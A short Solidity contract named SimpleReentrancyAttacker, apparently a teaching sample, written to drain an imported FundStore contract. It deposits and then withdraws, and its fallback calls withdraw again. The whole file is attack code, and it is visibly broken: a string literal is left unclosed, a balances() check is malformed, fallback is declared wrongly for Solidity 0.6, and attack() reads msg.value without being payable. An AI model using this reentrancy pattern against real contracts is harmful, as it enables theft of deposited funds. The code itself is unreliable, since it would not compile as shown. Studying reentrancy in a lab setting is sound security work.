// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "./FundStore.sol";

contract SimpleReentrancyAttacker{

    FundStore victimContract;

    function fallback(){
        victimContract.withdraw(1 ether);
    }

    function attack(address _contractToBeAttacked){
        require(msg.value >= 1 ether, "NOTEBAL);
        victimContract = FundStore(_contractToBeAttacked);
        require(balances(_contractToBeAttacked > 0));
        victimContract.deposit{value: 1 ether}();
        victimContract.withdraw(1 ether);
    }
}